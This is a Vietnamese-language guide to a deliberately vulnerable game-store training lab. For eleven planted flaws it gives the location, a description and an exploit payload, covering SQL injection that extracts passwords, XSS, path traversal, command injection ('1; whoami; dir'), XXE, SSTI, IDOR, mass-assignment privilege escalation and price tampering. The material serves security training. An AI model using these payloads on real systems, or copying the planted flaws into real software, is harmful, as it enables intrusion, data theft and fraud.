# GameLab Security Range — OWASP Vulnerability Lab Guide

Tài liệu này tổng hợp toàn bộ danh sách các lỗ hổng bảo mật được cài đặt cố ý (deliberate vulnerabilities) trong bài Lab GameLab, bao gồm vị trí xuất hiện trên giao diện/API, cách thức khai thác (exploit payload) và kết quả mong muốn thu được.

---

## Danh Sách Lỗ Hổng Bảo Mật (OWASP TOP 10 & Business Logic)

### 1. SQL Injection (SQLi)
*   **Vị trí**:
    *   API Tìm kiếm: `GET /api/products/search?q=` (Dùng tại trang chủ `index.html` và trang Deals).
    *   API Lọc sản phẩm: `GET /api/products?brand=` (Dùng ở thanh filter trang chủ).
    *   API Áp mã giảm giá: `GET /api/coupons/validate?code=`.
*   **Mô tả**: Backend sử dụng phép cộng chuỗi trực tiếp (String Concatenation) để xây dựng câu truy vấn SQL thô thay vì sử dụng Prepared Statement.
*   **Cách thức khai thác**:
    *   Truy cập URL sau trên trình duyệt để trích xuất thông tin người dùng từ bảng `users`:
        ```http
        http://localhost/api/products/search?q=a' UNION SELECT 1,username,password,role_id,5,6,7,8 FROM users -- 
        ```
    *   Hoặc sử dụng SQLi trong mã coupon để bỏ qua logic xác thực mã giảm giá.

---

### 2. Broken Object Level Authorization (IDOR / BOLA)
*   **Vị trí**:
    *   API Xem chi tiết đơn hàng: `GET /api/orders/:id` (Dùng tại tệp [orders.html](file:///C:/STUDY/ThucTap/CMC_Training/ecommerce-lab/frontend/orders.html)).
*   **Mô tả**: API chỉ kiểm tra xem người dùng có gửi kèm Token JWT hợp lệ hay không (`Authorization: Bearer <token>`), nhưng **không** kiểm tra xem đơn hàng có ID `:id` đó có thực sự thuộc quyền sở hữu của người dùng đang đăng nhập hay không.
*   **Cách thức khai thác**:
    *   Đăng nhập tài khoản thường (ví dụ: `user1` / `user1PasswordHash`).
    *   Bấm vào xem chi tiết đơn hàng của mình. Một hộp thoại popup hiện ra.
    *   *Khai thác (chỉ hiển thị với quyền Admin)*: Nhập ID đơn hàng của người dùng khác (ví dụ: `1` hoặc `2`) vào ô truy vấn IDOR ở cuối modal chi tiết, bấm **Truy vấn**.
    *   Bạn sẽ đọc được toàn bộ chi tiết game đã mua, tổng tiền và cả mã CD-Key của người dùng khác.

---

### 3. Unrestricted File Upload (Arbitrary File Upload)
*   **Vị trí**:
    *   API Tải ảnh đại diện: `POST /api/users/avatar` (Dùng tại tệp [profile.html](file:///C:/STUDY/ThucTap/CMC_Training/ecommerce-lab/frontend/profile.html)).
*   **Mô tả**: Thư viện xử lý upload Multer trên server không lọc định dạng đuôi file hoặc MIME type. Cho phép upload bất kỳ tệp tin nào (ví dụ tệp `.html` chứa mã độc JS, `.js`, v.v.).
*   **Cách thức khai thác**:
    *   Tru cập trang **Hồ sơ cá nhân**.
    *   Tạo một file HTML chứa mã độc XSS đơn giản (ví dụ: `malicious.html` với nội dung `<script>alert(document.cookie)</script>`).
    *   Tải tệp này lên thông qua khung Upload.
    *   Backend sẽ lưu tệp vào thư mục tĩnh `/uploads/` và trả về đường dẫn (ví dụ: `/uploads/1721183000-malicious.html`).
    *   Truy cập đường dẫn tĩnh này trên trình duyệt để kích hoạt mã độc thực thi trong ngữ cảnh nguồn của trang web.

---

### 4. Stored Cross-Site Scripting (Stored XSS)
*   **Vị trí**:
    *   API Đánh giá sản phẩm: `POST /api/products/:id/reviews` (Dùng tại tệp [product.html](file:///C:/STUDY/ThucTap/CMC_Training/ecommerce-lab/frontend/product.html)).
*   **Mô tả**: Phần bình luận lưu trực tiếp nội dung người dùng nhập vào database. Khi kết xuất ra giao diện, frontend sử dụng thuộc tính `innerHTML` nối chuỗi trực tiếp mà không qua bộ lọc làm sạch đầu vào (sanitization).
*   **Cách thức khai thác**:
    *   Vào trang chi tiết một game bất kỳ.
    *   Viết đánh giá với nội dung chứa mã Script:
        ```html
        <img src="x" onerror="alert('Stored XSS Triggered!')" />
        ```
    *   Bấm gửi. Đánh giá sẽ được lưu vào DB. Mỗi khi có ai đó truy cập trang chi tiết game này, mã độc sẽ tự động thực thi trên trình duyệt của họ.

---

### 5. DOM-Based Cross-Site Scripting (DOM XSS)
*   **Vị trí**:
    *   Khung hiển thị kết quả tìm kiếm ở trang chủ: [index.html](file:///C:/STUDY/ThucTap/CMC_Training/ecommerce-lab/frontend/index.html).
*   **Mô tả**: Frontend lấy trực tiếp tham số truy vấn `q` từ URL thông qua `URLSearchParams` và ghi đè vào phần tử tiêu đề bằng thuộc tính `innerHTML`.
*   **Cách thức khai thác**:
    *   Truy cập đường dẫn sau để chèn mã độc JavaScript chạy ngay lập tức thông qua DOM:
        ```http
        http://localhost/index.html?q=<iframe src="javascript:alert('DOM XSS')"></iframe>
        ```

---

### 6. Local File Inclusion (LFI) / Path Traversal
*   **Vị trí**:
    *   API Đọc file hệ thống: `GET /api/files?path=` (Dùng tại tab **File Reader** trên trang Admin Dashboard [admin.html](file:///C:/STUDY/ThucTap/CMC_Training/ecommerce-lab/frontend/admin.html)).
*   **Mô tả**: API đọc trực tiếp đường dẫn file được gửi lên thông qua `fs.readFileSync` mà không kiểm tra, chuẩn hóa hoặc chặn ký tự dịch chuyển thư mục như `../`.
*   **Cách thức khai thác**:
    *   Vào Admin Dashboard, chọn tab **File Reader**.
    *   Nhập đường dẫn tương đối để đọc các tệp tin cấu hình nhạy cảm của dự án:
        ```text
        ../package.json
        ../server.js
        ```
    *   Nội dung file sẽ hiển thị nguyên bản trong khung kết quả.

---

### 7. OS Command Injection
*   **Vị trí**:
    *   API Xuất hóa đơn: `POST /api/orders/export` (Dùng tại tab **Export Order** trên trang Admin Dashboard hoặc nút **Xuất hóa đơn** ở trang lịch sử mua hàng [orders.html](file:///C:/STUDY/ThucTap/CMC_Training/ecommerce-lab/frontend/orders.html)).
*   **Mô tả**: Server sử dụng hàm hệ thống `child_process.exec` để chạy lệnh Shell xuất hóa đơn bằng cách cộng chuỗi trực tiếp tham số `order_id` từ client gửi lên.
*   **Cách thức khai thác**:
    *   *Khai thác qua API*: Gửi một payload JSON chứa lệnh nối tiếp qua POST:
        ```json
        { "order_id": "1; whoami; dir" }
        ```
    *   Kết quả trả về sẽ chứa thông tin tài khoản đang chạy tiến trình Node (ví dụ: `root` hoặc tên user Windows) kèm danh sách thư mục hiện hành trong phản hồi stdout.

---

### 8. XML External Entity (XXE Injection)
*   **Vị trí**:
    *   API Nhập sản phẩm bằng XML: `POST /admin/products/import` (Dùng tại tab **Import Product XML** trên trang Admin Dashboard).
*   **Mô tả**: API nhận chuỗi XML và phân tích bằng bộ xử lý. Để mô phỏng XXE trên môi trường thực tế, hệ thống trích xuất khai báo thực thể hệ thống `SYSTEM` và đọc tệp đích trên máy chủ chèn vào kết quả.
*   **Cách thức khai thác**:
    *   Vào Admin Dashboard, chọn tab **Import Product XML**.
    *   Nhập nội dung XML khai báo thực thể đọc tệp `package.json` trên máy chủ:
        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE test [
          <!ENTITY xxe SYSTEM "file://package.json">
        ]>
        <product>
          <name>Game Khủng XXE</name>
          <price>49.99</price>
          <stock>50</stock>
          <description>&xxe;</description>
        </product>
        ```
    *   Bấm **Import XML**. Phản hồi trả về hoặc sản phẩm được tạo mới sẽ chứa nội dung của tệp `package.json` trong phần mô tả sản phẩm.

---

### 9. Server-Side Template Injection (SSTI)
*   **Vị trí**:
    *   API Gửi thông báo hệ thống: `GET /api/notify?template=` (Dùng tại tab **System Notify** trên trang Admin Dashboard).
*   **Mô tả**: Lấy tham số `template` từ client và đưa trực tiếp vào hàm render của EJS (`ejs.render(req.query.template, {})`).
*   **Cách thức khai thác**:
    *   Truy cập URL hoặc gửi lệnh thông báo chứa biểu thức tính toán EJS để kiểm tra:
        ```http
        http://localhost/api/notify?template=<%= 123 * 123 %>
        ```
    *   Kết quả hiển thị trên trang sẽ trả về `15129` (chứng minh template engine đã thông dịch biểu thức). Bạn có thể nâng cao khai thác để gọi thư viện hệ thống và thực thi mã tùy ý (RCE).

---

### 10. Mass Assignment (Property Injection)
*   **Vị trí**:
    *   API Cập nhật hồ sơ: `PUT /api/users/profile` (Dùng tại trang [profile.html](file:///C:/STUDY/ThucTap/CMC_Training/ecommerce-lab/frontend/profile.html)).
*   **Mô tả**: Backend duyệt qua mọi thuộc tính trong thân yêu cầu `req.body` để tự động xây dựng câu lệnh SQL cập nhật (`UPDATE users SET key = val...`) mà không kiểm tra whitelist các thuộc tính được phép sửa đổi.
*   **Cách thức khai thác**:
    *   Đăng nhập tài khoản thường. Vào trang **Hồ sơ cá nhân**.
    *   *Khai thác (chỉ hiển thị với quyền Admin)*: Tại khung **Developer Payload Tools** ở dưới cùng, nhập thuộc tính nâng quyền:
        ```json
        "role_id": 1
        ```
    *   Bấm **Lưu thay đổi**. Yêu cầu gửi lên sẽ gửi kèm thuộc tính này. Cột `role_id` của bạn trong DB sẽ cập nhật sang `1` (Admin). Tải lại trang và bạn sẽ thấy Navbar xuất hiện nút **Dashboard** dành cho Admin!

---

### 11. Insecure Price Validation (Lỗi logic nghiệp vụ giá tiền)
*   **Vị trí**:
    *   API Đặt hàng: `POST /api/orders` (Gửi đi từ trang thanh toán [checkout.html](file:///C:/STUDY/ThucTap/CMC_Training/ecommerce-lab/frontend/checkout.html)).
*   **Mô tả**: Backend chấp nhận trực tiếp giá tiền tổng hóa đơn (`total`) từ client gửi lên mà không thực hiện tính toán hay kiểm tra đối chiếu lại đơn giá thực tế của từng sản phẩm trong cơ sở dữ liệu.
*   **Cách thức khai thác**:
    *   Sử dụng các công cụ chặn bắt và sửa đổi gói tin (ví dụ: Burp Suite) khi bấm nút **Thanh toán**.
    *   Hoặc chỉnh sửa thủ công giá tiền của sản phẩm trong giỏ hàng lưu trữ ở client-side (`sessionStorage.getItem('cart')`) trước khi tiến hành thanh toán.
    *   Ví dụ: Sửa đổi giá sản phẩm từ `$59.99` thành `$0.01` và gửi thanh toán. Đơn hàng sẽ được tạo thành công và kích hoạt ngay lập tức vào thư viện với giá tiền là `$0.01`.
